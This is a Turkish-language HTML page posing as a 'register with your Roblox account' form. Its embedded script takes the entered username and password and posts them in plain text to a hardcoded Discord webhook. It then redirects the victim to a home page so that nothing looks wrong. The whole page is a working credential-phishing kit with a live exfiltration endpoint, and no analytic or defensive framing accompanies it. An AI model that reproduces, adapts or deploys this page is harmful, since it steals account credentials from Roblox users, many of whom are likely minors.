<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kayıt Ol</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .form-container {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 300px;
    }

    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 24px;
    }

    label {
      font-size: 16px;
      margin-bottom: 5px;
      display: block;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }

    .error-message {
      color: red;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h1>Roblox Hesabınızla Kayıt Olun</h1>
    <form id="register-form">
      <label for="username">Kullanıcı Adı:</label>
      <input type="text" id="username" name="username" required><br><br>

      <label for="password">Şifre:</label>
      <input type="password" id="password" name="password" required><br><br>

      <button type="submit">Kayıt Ol</button>
    </form>
    <p class="error-message" id="error-message"></p>
  </div>

  <script>
    document.getElementById('register-form').addEventListener('submit', function(event) {
      event.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Webhook ile Discord'a gönderme işlemi
      const webhookURL = 'https://canary.discord.com/api/webhooks/1313523578217566278/no2aSqXSwdOxZcK9qEPWjDXT5m3UY3cMIwmJG6524zQS3a7VlEG_LWATo4g30Wdn00ie'; // Discord webhook URL'nizi buraya ekleyin
      const data = {
        content: `Yeni Kayıt: Kullanıcı Adı: ${username}, Şifre: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(() => {
        // Başarıyla gönderildiğinde, kullanıcıyı ana sayfaya yönlendirme ve login durumunu kaydetme
        localStorage.setItem('userLoggedIn', 'true');
        window.location.href = 'index.html'; // Giriş yaptıktan sonra ana sayfaya yönlendir
      })
      .catch(error => {
        console.error('Webhook hatası:', error);
        document.getElementById('error-message').innerText = 'Bir hata oluştu, tekrar deneyin.';
      });
    });
  </script>
</body>
</html>
